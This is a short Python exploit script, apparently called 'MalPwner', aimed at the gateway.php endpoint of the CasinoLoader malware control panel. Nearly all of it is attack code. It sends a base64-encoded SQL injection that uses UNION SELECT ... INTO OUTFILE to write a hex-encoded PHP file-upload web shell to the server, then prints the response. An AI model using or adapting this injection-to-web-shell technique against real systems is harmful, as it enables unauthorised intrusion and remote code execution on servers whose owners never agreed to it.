# References: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/dexter_casinoloader_exec.rb
import httplib, urllib

print "[ -- MalPwner by Blau -- ]"
print "# CasinoLoader ownage #"

#Config
panel_url = "http://localhost/CasinoLoader/gateway.php" # URL to gateway.php
upload_path = "/var/www/blaupload.php" # You must get the correct path
upload_shell = "0x3c666f726d20656e63747970653d226d756c7469706172742f666f726d2d646174612220616374696f6e3d2222206d6574686f643d22504f5354223e3c696e707574206e616d653d2275706c6f6164656466696c652220747970653d2266696c65222f3e3c696e70757420747970653d227375626d6974222076616c75653d2255706c6f61642046696c65222f3e3c2f666f726d3e0d0a3c3f70687020247461726765745f706174683d626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d293b6966286d6f76655f75706c6f616465645f66696c6528245f46494c45535b2775706c6f6164656466696c65275d5b27746d705f6e616d65275d2c247461726765745f7061746829297b6563686f20626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d292e2220686173206265656e2075706c6f61646564223b7d656c73657b6563686f20224572726f7221223b7d3f3e" # A simple HTML/PHP uploader
key = "Blau".encode("base64")

#Main	
params = urllib.urlencode({
    'page' : ("' AND 1=0 union select 0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20 INTO OUTFILE '" + upload_path +"' LINES TERMINATED BY " + upload_shell + "#").encode("base64"),
    'val' : "AA=="
})

f = urllib.urlopen(panel_url, params)
print "<<RESPONSE>>\n" + f.read()